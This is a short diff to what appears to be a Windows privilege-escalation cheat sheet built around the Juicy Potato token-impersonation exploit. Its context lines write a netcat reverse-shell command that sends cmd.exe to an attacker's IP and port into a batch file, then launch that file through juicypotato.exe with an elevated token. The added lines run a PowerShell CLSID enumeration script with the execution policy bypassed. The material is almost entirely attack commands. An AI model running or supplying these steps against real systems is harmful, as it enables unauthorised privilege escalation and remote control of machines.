@@ -33,6 +33,13 @@ echo C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port> > rev.bat
 [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
 
 ```cmd
+powershell -ep bypass -f "C:\Windows\Temp\GetCLSID.ps1"
+REM test
+test_clsid.bat
+type result.log
+```
+
+```cmd
 C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l <attacker port> -t * -c <CLSID>
 REM -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
 REM -p <program>: program to launch
